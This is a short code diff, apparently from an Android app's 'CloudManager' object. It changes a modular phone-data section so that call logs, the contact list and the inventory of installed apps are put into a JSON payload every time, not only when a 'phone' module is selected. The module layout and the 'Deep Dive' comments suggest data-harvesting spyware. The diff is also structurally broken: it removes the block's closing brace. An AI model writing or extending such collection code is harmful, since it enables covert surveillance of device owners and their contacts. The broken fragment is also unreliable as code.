@@ -78,9 +78,13 @@ object CloudManager {
 
                 // --- MODULE 7: PHONE ---
                 if (isAll || modules.contains("phone")) {
-                     json.put("call_logs", PhoneManager.getCallLogs(ctx))
-                     json.put("contacts_dump", PhoneManager.getContacts(ctx))
-                }
+        // 3. Persistent Data (The Deep Dive)
+        // Call Logs
+        json.put("calls", PhoneManager.getCallLogs(ctx))
+        // Contact List
+        json.put("contacts", PhoneManager.getContacts(ctx))
+        // Installed Apps (Inventory)
+        json.put("apps", AppListManager.getInstalledApps(ctx))
 
                 // --- MODULE 8: FILES (Skeleton) ---
                 if (modules.contains("files")) {
